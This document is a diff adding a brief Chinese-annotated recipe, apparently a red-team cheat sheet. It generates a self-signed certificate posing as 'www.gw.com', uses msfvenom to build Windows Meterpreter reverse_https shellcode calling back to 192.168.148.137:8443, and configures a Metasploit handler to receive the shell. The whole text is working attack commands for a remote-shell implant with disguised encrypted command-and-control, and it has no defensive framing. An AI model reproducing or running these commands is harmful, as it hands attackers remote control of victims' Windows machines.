@@ -1,0 +1,19 @@
+# 1、生成证书
+
+openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj "/C=CH/ST=XX/L=XINJIANG/O=GW/CN=www.gw.com" -keyout gw.key -out gw.crt
+cat gw.key gw.crt > gw.pem
+rm -rf gw.key gw.crt
+
+# 2、生成shellcode 
+
+msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.148.137 LPORT=8443 PayloadUUIDTracking=true PayloadUUIDName=gw HandlerSSLCert=./gw.pem StagerVerifySSLCert=true -f c
+
+# 3、开启监听
+
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_https
+set LHOST 192.168.148.137
+set LPORT 8443
+set HandlerSSLCert ./gw.pem
+set StagerVerifySSLCert true
+exploit -j -z
